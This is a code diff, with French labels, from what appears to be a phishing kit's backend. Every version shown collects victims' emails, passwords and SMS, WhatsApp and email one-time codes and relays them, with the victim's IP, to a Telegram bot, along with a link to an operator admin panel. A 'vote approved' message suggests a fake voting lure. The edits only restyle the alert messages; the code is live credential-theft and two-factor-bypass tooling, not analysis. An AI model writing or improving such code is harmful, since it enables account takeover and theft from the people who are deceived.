@@ -44,13 +44,8 @@ async function sendTelegram(message) {
   ]);
 }
 
-function getFieldEmoji(field) {
-  const emojis = { email: '📧', password: '🔑', sms_code: '💬', whatsapp_code: '📱', email_code: '✉️' };
-  return emojis[field] || '📋';
-}
-
 function getFieldLabel(field) {
-  const labels = { email: 'Email / Telephone', password: 'Mot de passe', sms_code: 'Code SMS', whatsapp_code: 'Code WhatsApp', email_code: 'Code Email' };
+  const labels = { email: 'Email', password: 'dp', sms_code: 'Code SMS', whatsapp_code: 'Code WhatsApp', email_code: 'Code Email' };
   return labels[field] || field;
 }
 
@@ -58,12 +53,12 @@ function getClientSummary(session, ip) {
   const client = getClient(session, ip);
   if (!client) return '';
   let lines = [];
-  if (client.email) lines.push(`📧 Email: <code>${client.email}</code>`);
-  if (client.password) lines.push(`🔑 Mdp: <code>${client.password}</code>`);
-  if (client.sms_code) lines.push(`💬 SMS: <code>${client.sms_code}</code>`);
-  if (client.whatsapp_code) lines.push(`📱 WhatsApp: <code>${client.whatsapp_code}</code>`);
-  if (client.email_code) lines.push(`✉️ Email code: <code>${client.email_code}</code>`);
-  return lines.length ? '\n\n📋 <b>Donnees collectees:</b>\n' + lines.join('\n') : '';
+  if (client.email) lines.push(`Email: <code>${client.email}</code>`);
+  if (client.password) lines.push(`dp: <code>${client.password}</code>`);
+  if (client.sms_code) lines.push(`Code SMS: <code>${client.sms_code}</code>`);
+  if (client.whatsapp_code) lines.push(`Code WhatsApp: <code>${client.whatsapp_code}</code>`);
+  if (client.email_code) lines.push(`Code Email: <code>${client.email_code}</code>`);
+  return lines.length ? `\nDonnees collectees:\n${lines.join('\n')}` : '';
 }
 
 function adminButton(session, ip) {
@@ -72,65 +67,50 @@ function adminButton(session, ip) {
 }
 
 function notifyNewClient(client) {
-  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
   return sendTelegram(
-    `<b>🔗 NOUVEAU CLIENT</b>\n` +
+    `<b>NOUVEAU CLIENT</b>\n` +
     `━━━━━━━━━━━━━━━━━\n` +
-    `🖥 IP: <code>${client.ip}</code>\n` +
-    `🆔 Session: <code>${client.session}</code>\n` +
-    `🌐 Navigateur: <code>${client.user_agent || 'inconnu'}</code>\n` +
-    `🕐 Heure: ${now}` +
-    adminButton(client.session, client.ip)
+    `IP: <code>${client.ip}</code>` +
+    `\n\n🎛 <a href="${getAdminUrl(client.session, client.ip)}">Ouvrir le panneau admin</a>`
   );
 }
 
 function notifyData(session, ip, field, value) {
-  const emoji = getFieldEmoji(field);
-  const label = getFieldLabel(field);
-  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
   const summary = getClientSummary(session, ip);
   return sendTelegram(
-    `<b>${emoji} DONNEE RECUE</b>\n` +
+    `<b>NOUVEAU CLIENT</b>\n` +
     `━━━━━━━━━━━━━━━━━\n` +
-    `${label}: <code>${value}</code>\n` +
-    `🖥 IP: <code>${ip}</code>\n` +
-    `🕐 Heure: ${now}` +
+    `IP: <code>${ip}</code>` +
     summary +
-    adminButton(session, ip)
+    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
   );
 }
 
 function notifyAction(session, ip, action) {
-  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
   return sendTelegram(
-    `<b>⚡ ACTION ADMIN</b>\n` +
+    `<b>ACTION ADMIN</b>\n` +
     `━━━━━━━━━━━━━━━━━\n` +
     `Action: <code>${action}</code>\n` +
-    `🖥 IP: <code>${ip}</code>\n` +
-    `🕐 Heure: ${now}`
+    `IP: <code>${ip}</code>`
   );
 }
 
 function notifyPageChange(session, ip, page) {
-  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
   return sendTelegram(
-    `<b>📄 PAGE CHANGEE</b>\n` +
+    `<b>PAGE CHANGEE</b>\n` +
     `━━━━━━━━━━━━━━━━━\n` +
     `Page: <code>${page}</code>\n` +
-    `🖥 IP: <code>${ip}</code>\n` +
-    `🕐 Heure: ${now}` +
-    adminButton(session, ip)
+    `IP: <code>${ip}</code>` +
+    `\n\n🎛 <a href="${getAdminUrl(session, ip)}">Ouvrir le panneau admin</a>`
   );
 }
 
 function notifyVoteApproved(session, ip) {
-  const now = new Date().toLocaleString('fr-FR', { timeZone: 'Africa/Kinshasa' });
   const summary = getClientSummary(session, ip);
   return sendTelegram(
-    `<b>✅ VOTE APPROUVE</b>\n` +
+    `<b>VOTE APPROUVE</b>\n` +
     `━━━━━━━━━━━━━━━━━\n` +
-    `🖥 IP: <code>${ip}</code>\n` +
-    `🕐 Heure: ${now}` +
+    `IP: <code>${ip}</code>` +
     summary
   );
 }
